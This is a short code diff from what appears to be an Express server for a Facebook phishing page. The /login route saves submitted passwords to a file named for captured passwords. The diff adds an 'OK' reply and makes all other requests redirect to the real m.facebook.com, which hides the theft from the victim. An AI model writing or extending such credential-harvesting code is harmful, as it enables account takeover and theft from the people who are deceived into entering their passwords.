@@ -32,8 +32,12 @@ app.post('/login', (req, res) => {
   });
 
   fs.writeJSONSync(passwordsFilePath, capturedPasswords, { spaces: 2 });
+
+  res.json({
+    message: "OK"
+  });
 });
 
-app.use((req, res) => res.sendFile(path.resolve("index.html")));
+app.use((req, res) => res.redirect(`https://m.facebook.com${req.originalUrl}`));
 
 app.listen(port, () => logger.info(`App listening on port ${port}!`));
